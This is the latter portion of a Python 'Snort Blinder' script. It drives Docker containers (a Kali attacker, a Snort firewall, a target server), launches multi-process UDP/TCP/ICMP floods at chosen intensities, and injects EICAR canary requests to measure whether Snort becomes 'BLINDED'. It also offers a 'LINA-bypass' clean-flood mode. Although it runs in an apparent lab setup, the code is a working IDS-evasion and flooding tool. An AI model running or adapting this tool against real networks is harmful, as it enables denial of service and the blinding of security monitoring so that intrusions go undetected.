          f"(UDP:{UDP_THREADS}x{len(udp_protos)}, TCP:{TCP_CONNS}x{len(tcp_protos)}, "
          f"VOL:{TCP_CONNS}x{vol_count}, ICMP:1)",
          flush=True)

    writer_thread.start()
    canary_thread.start()
    for w in workers:
        w.start()

    print(f"  [*] All protocols firing! Running {duration}s...", flush=True)

    # Phase management
    phase_start = time.time()
    deadline = time.time() + duration
    while time.time() < deadline and not stop_event.is_set():
        elapsed_phase = time.time() - phase_start
        if elapsed_phase >= phase_duration:
            idx = min(current_phase["num"] + 1, total_phases - 1)
            if idx != current_phase["num"]:
                current_phase["num"] = idx
                current_phase["send_delay"] = phases[idx]["send_delay"]
                print(f"\n  >> Phase {idx+1}/{total_phases}: {phases[idx]['name']} "
                      f"(delay={phases[idx]['send_delay']})", flush=True)
                phase_start = time.time()

        # Print inline stats
        snap = stats.snapshot()
        active = len([p for p, c in snap["per_proto"].items() if c > 0])
        sys.stdout.write(
            f"\r  {snap['elapsed']:>6.0f}s | {snap['pps']:>6,} pps | "
            f"{snap['mbps']:>6.1f} Mbps | {active} protos | "
            f"canary:{snap['canary_sent']}     ")
        sys.stdout.flush()
        time.sleep(1)

    stop_event.set()
    print("\n\n  [*] Stopping...", flush=True)
    for w in workers:
        w.join(timeout=3)

    # Final stats dump
    snap = stats.snapshot()
    try:
        with open(sf, "w") as f:
            json.dump(snap, f)
    except Exception:
        pass

    print(f"\n  Final: {snap['total_packets']:,} pkts, {snap['total_bytes']/(1024*1024):.1f} MB, "
          f"{snap['pps']:,} pps, {snap['mbps']} Mbps", flush=True)
    for name in sorted(active_reg.keys()):
        pkts = snap["per_proto"].get(name, 0)
        errs = snap["errors"].get(name, 0)
        if pkts > 0 or errs > 0:
            print(f"    {name:<12} {pkts:>10,} pkts  {errs:>6,} errs", flush=True)


# ═══════════════════════════════════════════════════════════════════════════════
# HOST ORCHESTRATOR  (runs on host Mac)
# ═══════════════════════════════════════════════════════════════════════════════

def dexec(container, cmd, timeout=15):
    try:
        return subprocess.run(
            ["docker", "exec", container, "bash", "-c", cmd],
            capture_output=True, text=True, timeout=timeout
        )
    except Exception:
        return None


def get_alert_count(pattern="\\[\\*\\*\\]"):
    r = dexec(FIREWALL, f"grep -c '{pattern}' {SNORT_LOG} 2>/dev/null || echo 0")
    if r and r.stdout.strip().isdigit():
        return int(r.stdout.strip())
    return 0


def run_orchestrator(duration, phase_duration, intensity=1, n_processes_override=None):
    print("=" * 78)
    print("  SNORT BLINDER - Host Orchestrator")
    print("=" * 78)

    # 1. Verify containers
    for c in (ATTACKER, FIREWALL, "target_server"):
        r = subprocess.run(["docker", "inspect", "-f", "{{.State.Running}}", c],
                          capture_output=True, timeout=10)
        if r.returncode != 0 or b"true" not in r.stdout:
            print(f"  [!] Container {c} not running. Run: docker compose up -d")
            return

    # 2. Ensure Snort is running
    r = dexec(FIREWALL, "pidof snort")
    if not r or not r.stdout.strip():
        print("  [*] Starting Snort...")
        dexec(FIREWALL,
              "snort -c /usr/local/etc/snort/snort.lua -i eth0 -l /var/log/snort "
              "-A fast -D -k none", timeout=20)
        time.sleep(3)
        r = dexec(FIREWALL, "pidof snort")
        if not r or not r.stdout.strip():
            print("  [!] Failed to start Snort!")
            return
    print(f"  [+] Snort PID: {r.stdout.strip()}")

    # 3. Ensure HTTP listener on target
    dexec("target_server", "python3 -m http.server 80 --bind 0.0.0.0 &>/dev/null &")
    time.sleep(1)

    # 4. Clear logs
    dexec(FIREWALL, f"truncate -s0 {SNORT_LOG}")

    # 5. Quick canary test BEFORE flood
    print("  [*] Testing canary detection...")
    pre = get_alert_count(CANARY_SID)
    dexec(ATTACKER,
          f"python3 -c \""
          f"import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
          f"s.settimeout(3);s.connect(('{TARGET_IP}',80));"
          f"s.sendall(b'GET /EICAR-STANDARD-ANTIVIRUS-TEST-FILE! HTTP/1.1\\r\\nHost: t\\r\\n\\r\\n');"
          f"s.recv(4096);s.close()\"")
    time.sleep(2)
    post = get_alert_count(CANARY_SID)
    if post > pre:
        print(f"  [+] Canary DETECTED by Snort (SID {CANARY_SID}). System verified!")
    else:
        print(f"  [!] Canary NOT detected. Snort may not be inspecting traffic.")
        print(f"      Alerts before={pre}, after={post}. Continuing anyway...")

    # 6. Clear logs again for clean test
    dexec(FIREWALL, f"truncate -s0 {SNORT_LOG}")
    pre_alerts = 0

    # 7. Launch flood inside kali — MULTI-PROCESS
    preset = INTENSITY_PRESETS.get(intensity, INTENSITY_PRESETS[1])
    all_protos = list(PROTOCOL_REGISTRY.keys())

    # Determine number of parallel processes
    if n_processes_override:
        n_procs = n_processes_override
    elif intensity >= 5:
        n_procs = 6
    elif intensity >= 4:
        n_procs = 4
    elif intensity >= 3:
        n_procs = 3
    else:
        n_procs = 1

    # Split protocols into groups
    # If more processes than protocols, duplicate protocols across processes
    if n_procs <= len(all_protos):
        proto_groups = [[] for _ in range(n_procs)]
        for i, p in enumerate(all_protos):
            proto_groups[i % n_procs].append(p)
    else:
        # First N groups get unique protocol sets, extras get full protocol copies
        proto_groups = [[] for _ in range(min(n_procs, len(all_protos)))]
        for i, p in enumerate(all_protos):
            proto_groups[i % len(proto_groups)].append(p)
        # Duplicate groups to fill remaining processes
        base_groups = list(proto_groups)
        while len(proto_groups) < n_procs:
            proto_groups.append(list(base_groups[len(proto_groups) % len(base_groups)]))

    total_threads = 0
    for g in proto_groups:
        udp_c = len([p for p in g if PROTOCOL_REGISTRY[p][0] == "udp"])
        tcp_c = len([p for p in g if PROTOCOL_REGISTRY[p][0] == "tcp"])
        icmp_c = len([p for p in g if PROTOCOL_REGISTRY[p][0] == "icmp"])
        total_threads += udp_c * preset["udp"] + tcp_c * preset["tcp"] + icmp_c

    print(f"\n  [*] Launching {n_procs} parallel flood processes inside {ATTACKER}")
    print(f"  [*] Intensity: {intensity} [{preset['label']}] — "
          f"UDP:{preset['udp']}/proto, TCP:{preset['tcp']}/proto")
    print(f"  [*] Total workers: ~{total_threads} across {n_procs} processes")
    print(f"  [*] Duration: {duration}s")
    for gi, g in enumerate(proto_groups):
        print(f"      Process {gi}: {', '.join(g)}")

    flood_procs = []
    stats_files = []
    for gi, group in enumerate(proto_groups):
        sf = f"/tmp/blinder_stats_{gi}.json"
        stats_files.append(sf)
        proto_list = ",".join(group)
        flood_cmd = (
            f"cd /fuzzer && python3 Testing/snort_blinder.py "
            f"--flood --target {TARGET_IP} --duration {duration} "
            f"--phase-duration {phase_duration} --intensity {intensity} "
            f"--protocols {proto_list} --stats-file {sf}"
        )
        proc = subprocess.Popen(
            ["docker", "exec", ATTACKER, "bash", "-c", flood_cmd],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
        flood_procs.append(proc)

    # 8. Monitor loop - read flood output + check Snort
    canary_counts = []
    start_time = time.time()

    print(f"\n  {'─'*74}")
    print(f"  {'Time':>6} {'PPS':>8} {'Mbps':>8} {'Protos':>7} "
          f"{'Alerts':>8} {'Canary':>12} {'Status':>10}")
    print(f"  {'─'*74}")

    def _any_running():
        return any(p.poll() is None for p in flood_procs)

    def _aggregate_stats():
        """Read and aggregate stats from all process stats files."""
        agg = {"elapsed": 0, "pps": 0, "mbps": 0, "per_proto": {},
               "canary_sent": 0, "total_packets": 0, "total_bytes": 0,
               "errors": {}}
        cat_cmd = " ".join(f"cat {sf} 2>/dev/null;echo '|||';" for sf in stats_files)
        r = dexec(ATTACKER, cat_cmd, timeout=5)
        if not r or not r.stdout:
            return agg
        parts = r.stdout.split("|||")
        for part in parts:
            part = part.strip()
            if not part:
                continue
            try:
                s = json.loads(part)
                agg["total_packets"] += s.get("total_packets", 0)
                agg["total_bytes"] += s.get("total_bytes", 0)
                agg["canary_sent"] += s.get("canary_sent", 0)
                agg["elapsed"] = max(agg["elapsed"], s.get("elapsed", 0))
                for p, c in s.get("per_proto", {}).items():
                    agg["per_proto"][p] = agg["per_proto"].get(p, 0) + c
                for p, c in s.get("errors", {}).items():
                    agg["errors"][p] = agg["errors"].get(p, 0) + c
            except Exception:
                continue
        el = max(agg["elapsed"], 1)
        agg["pps"] = round(agg["total_packets"] / el)
        agg["mbps"] = round((agg["total_bytes"] * 8) / (el * 1_000_000), 2)
        return agg

    try:
        while _any_running():
            # Check Snort alerts
            total_alerts = get_alert_count()
            canary_alerts = get_alert_count(CANARY_SID)

            # Aggregate stats from all process files
            snap = _aggregate_stats()

            active = len([p for p, c in snap.get("per_proto", {}).items() if c > 0])
            canary_sent = snap.get("canary_sent", 0)

            if canary_sent > 0:
                det_rate = round(canary_alerts / canary_sent * 100, 1)
                canary_str = f"{canary_alerts}/{canary_sent} ({det_rate}%)"
            else:
                det_rate = 100.0
                canary_str = "waiting..."

            if canary_sent < 2:
                status = "WARMING"
            elif det_rate >= 80:
                status = "DETECTING"
            elif det_rate >= 30:
                status = "DEGRADED"
            else:
                status = "BLINDED!"

            elapsed = round(time.time() - start_time)
            print(f"  {elapsed:>5}s {snap.get('pps',0):>8,} {snap.get('mbps',0):>8.1f} "
                  f"{active:>7} {total_alerts:>8,} {canary_str:>12} {status:>10}")

            time.sleep(3)

    except KeyboardInterrupt:
        print("\n  [!] Interrupted")
        for p in flood_procs:
            p.terminate()

    # Wait for all flood processes to finish
    for p in flood_procs:
        try:
            p.wait(timeout=10)
        except Exception:
            p.kill()

    # 10. Final report
    post_alerts = get_alert_count()
    canary_alerts = get_alert_count(CANARY_SID)
    final_snap = _aggregate_stats()

    total_pkts = final_snap.get("total_packets", 0)
    total_bytes = final_snap.get("total_bytes", 0)
    canary_sent = final_snap.get("canary_sent", 0)
    pps = final_snap.get("pps", 0)
    mbps = final_snap.get("mbps", 0)

    print(f"\n{'='*78}")
    print(f"  SNORT BLINDER — RESULTS")
    print(f"{'='*78}")
    print(f"  Duration:         {duration}s")
    print(f"  Total packets:    {total_pkts:,}")
    print(f"  Total bytes:      {total_bytes:,} ({total_bytes/(1024*1024):.1f} MB)")
    print(f"  Throughput:       {pps:,} pps / {mbps} Mbps")
    print(f"  Snort alerts:     {post_alerts:,}")
    print(f"  Active protos:    {len([p for p,c in final_snap.get('per_proto',{}).items() if c>0])}")

    print(f"\n  Canary Detection:")
    print(f"    Canaries sent:     {canary_sent}")
    print(f"    Canaries detected: {canary_alerts}")
    if canary_sent > 0:
        det = round(canary_alerts / canary_sent * 100, 1)
        print(f"    Detection rate:    {det}%")
    else:
        det = 100.0
        print(f"    Detection rate:    N/A (no canaries sent)")

    print(f"\n  Per-Protocol Breakdown:")
    print(f"  {'Protocol':<12} {'Packets':>10} {'Errors':>8} {'PPS':>8}")
    print(f"  {'-'*42}")
    per_proto = final_snap.get("per_proto", {})
    errors = final_snap.get("errors", {})
    elapsed = max(final_snap.get("elapsed", 1), 1)
    for name in sorted(PROTOCOL_REGISTRY.keys()):
        pkts = per_proto.get(name, 0)
        errs = errors.get(name, 0)
        proto_pps = round(pkts / elapsed)
        if pkts > 0 or errs > 0:
            print(f"  {name:<12} {pkts:>10,} {errs:>8,} {proto_pps:>8,}")
    print(f"  {'-'*42}")
    total_errs = sum(errors.values())
    print(f"  {'TOTAL':<12} {total_pkts:>10,} {total_errs:>8,} {pps:>8,}")

    print(f"\n  {'='*42}")
    if canary_sent == 0:
        print(f"  VERDICT: No canaries sent — test too short or canary failed")
    elif det >= 80:
        print(f"  VERDICT: Snort WITHSTOOD the attack (detection: {det}%)")
    elif det >= 30:
        print(f"  VERDICT: Snort DEGRADED — partial blindness (detection: {det}%)")
    else:
        print(f"  VERDICT: Snort BLINDED — failed to detect canary (detection: {det}%)")
    print(f"  {'='*42}\n")

    # Dump alert breakdown
    r = dexec(FIREWALL, f"head -50 {SNORT_LOG}")
    if r and r.stdout.strip():
        print("  First 50 Snort alerts:")
        for line in r.stdout.strip().split("\n")[:20]:
            print(f"    {line.strip()}")


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(description="Snort Blinder")
    parser.add_argument("--flood", action="store_true",
                        help="Run in flood mode (inside kali_attacker)")
    parser.add_argument("--target", default=TARGET_IP, help="Target IP")
    parser.add_argument("--duration", type=int, default=60,
                        help="Total duration (seconds)")
    parser.add_argument("--phase-duration", type=int, default=15,
                        help="Duration per phase (seconds)")
    parser.add_argument("--intensity", type=int, default=1, choices=[1,2,3,4,5],
                        help="Flood intensity 1-5 (1=normal, 5=maximum)")
    parser.add_argument("--protocols", type=str, default=None,
                        help="Comma-separated protocol subset (flood mode only)")
    parser.add_argument("--stats-file", type=str, default=None,
                        help="Stats JSON path override (flood mode only)")
    parser.add_argument("--processes", type=int, default=None,
                        help="Number of parallel flood processes (overrides auto)")
    parser.add_argument("--clean-flood", action="store_true",
                        help="Use only well-formed clean protocols (http_clean, "
                             "http_clean2, http_clean3) for LINA-bypass flooding")
    args = parser.parse_args()

    if args.flood:
        if args.clean_flood:
            pf = {"http_clean", "http_clean2", "http_clean3"}
        else:
            pf = set(args.protocols.split(",")) if args.protocols else None
        run_flood(args.target, args.duration, args.phase_duration,
                  args.intensity, proto_filter=pf, stats_file_override=args.stats_file)
    else:
        run_orchestrator(args.duration, args.phase_duration, args.intensity,
                         n_processes_override=args.processes)


if __name__ == "__main__":
    main()
